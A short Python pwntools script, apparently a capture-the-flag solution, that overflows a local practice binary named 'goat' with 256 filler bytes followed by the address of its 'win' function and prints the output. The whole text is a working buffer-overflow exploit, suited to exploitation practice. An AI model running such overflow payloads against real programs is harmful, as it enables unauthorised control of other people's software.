from pwn import *
elf=ELF("./goat")
p=process("./goat")
garbage= b'A'*256


address=p32(elf.symbols['win'])
payload= garbage+address
p.sendline(payload)
msg=p.recvall()
print(msg)